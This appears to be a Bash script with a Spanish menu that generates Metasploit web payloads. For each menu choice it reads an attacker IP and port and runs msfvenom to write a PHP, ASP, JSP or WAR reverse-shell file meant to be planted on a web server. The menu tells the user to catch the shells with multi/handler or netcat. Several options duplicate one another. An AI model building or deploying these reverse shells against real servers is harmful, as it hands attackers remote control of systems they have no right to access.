#!/bin/bash

echo ""
opcion="ninguna"

function opcion1
{

echo ""
echo -e "\e[33m Ingrese la IP Atacante (LHOST) \e[0m"
echo ""
read ip

echo ""
echo -e "\e[33m Ingrese el puerto (LPORT) \e[0m"
echo ""
read port

msfvenom -p php/meterpreter_reverse_tcp LHOST=$ip LPORT=$port -f raw > shell.php
echo ""
echo "[+] Payload Creado!"


   read
   return 0

}

function opcion2
{

echo ""
echo -e "\e[33m Ingrese la IP Atacante (LHOST) \e[0m"
echo ""
read ip

echo ""
echo -e "\e[33m Ingrese el puerto (LPORT) \e[0m"
echo ""
read port

msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f asp > shell.asp
echo ""
echo "[+] Payload Creado!"

   read
   return 0

}

function opcion3
{

echo ""
echo -e "\e[33m Ingrese la IP Atacante (LHOST) \e[0m"
echo ""
read ip

echo ""
echo -e "\e[33m Ingrese el puerto (LPORT) \e[0m"
echo ""
read port

msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f raw > shell.jsp
echo ""
echo "[+] Payload Creado!"

   read
   return 0

}

function opcion4
{

echo ""
echo -e "\e[33m Ingrese la IP Atacante (LHOST) \e[0m"
echo ""
read ip

echo ""
echo -e "\e[33m Ingrese el puerto (LPORT) \e[0m"
echo ""
read port

msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f war > shell.war
echo ""
echo "[+] Payload Creado!"

   read
   return 0

}

function opcion5
{

echo ""
echo -e "\e[33m Ingrese la IP Atacante (LHOST) \e[0m"
echo ""
read ip

echo ""
echo -e "\e[33m Ingrese el puerto (LPORT) \e[0m"
echo ""
read port

msfvenom -p php/reverse_php LHOST=$ip LPORT=$port -f raw > shell.php
echo ""
echo "[+] Payload Creado!"

   read
   return 0

}

function opcion6
{

echo ""
echo -e "\e[33m Ingrese la IP Atacante (LHOST) \e[0m"
echo ""
read ip

echo ""
echo -e "\e[33m Ingrese el puerto (LPORT) \e[0m"
echo ""
read port

msfvenom -p windows/shell/reverse_tcp LHOST=$ip LPORT=$port -f asp > shell.asp
echo ""
echo "[+] Payload Creado!"

   read
   return 0

}

function opcion7
{

echo ""
echo -e "\e[33m Ingrese la IP Atacante (LHOST) \e[0m"
echo ""
read ip

echo ""
echo -e "\e[33m Ingrese el puerto (LPORT) \e[0m"
echo ""
read port

msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f raw > shell.jsp
echo ""
echo "[+] Payload Creado!"

   read
   return 0

}

function opcion8
{

echo ""
echo -e "\e[33m Ingrese la IP Atacante (LHOST) \e[0m"
echo ""
read ip

echo ""
echo -e "\e[33m Ingrese el puerto (LPORT) \e[0m"
echo ""
read port

msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f war > shell.war
echo ""
echo "[+] Payload Creado!"

   read
   return 0

}


while [ $opcion != "9"  ]
    do

echo ""
echo "	METASPLOIT WEB PAYLOADS	"
echo ""

echo ""

	echo -e "\e[31m \n	-- MENU -- \e[0m"
	echo ""
	echo -e "\t1) PHP	(WEB PAYLOAD - METERPRETER) "
        echo -e "\t2) ASP	(WEB PAYLOAD - METERPRETER) "
        echo -e "\t3) JSP	(WEB PAYLOAD - METERPRETER) "
        echo -e "\t4) WAR	(WEB PAYLOAD - METERPRETER) "
        echo -e "\t5) PHP  (CARGAS WEB QUE NO SON METERPRETER) "
        echo -e "\t6) ASP  (CARGAS WEB QUE NO SON METERPRETER) "
        echo -e "\t7) JSP  (CARGAS WEB QUE NO SON METERPRETER) "
        echo -e "\t8) WAR  (CARGAS WEB QUE NO SON METERPRETER) "

	echo -e "\t9) Salir\n"
	echo -e "\e[33m 	NO OLVIDE USAR METASPLOIT (use exploit/multi/handler) O (NETCAT-NC) \e[0m"
	echo -e "\e[33m \tOpcion: \c \e[0m"

read opcion

echo -e "\e[33m -------------------------------------------------------------  \e[0m"

        if [ -z $opcion ] ; then opcion="ninguna" ; fi

        case $opcion in
		"1" )
                      opcion1
  		      ;;
		"2" )
		      opcion2
		      ;;
                "3" )
                      opcion3
                      ;;
		"4" )
                      opcion4
                      ;;
                "5" )
                      opcion5
                      ;;
                "6" )
                      opcion6
                      ;;
                "7" )
                      opcion7
                      ;;
                "8" )
                      opcion8
                      ;;
		"*" )
		      ;;

	esac


	/usr/bin/clear
done
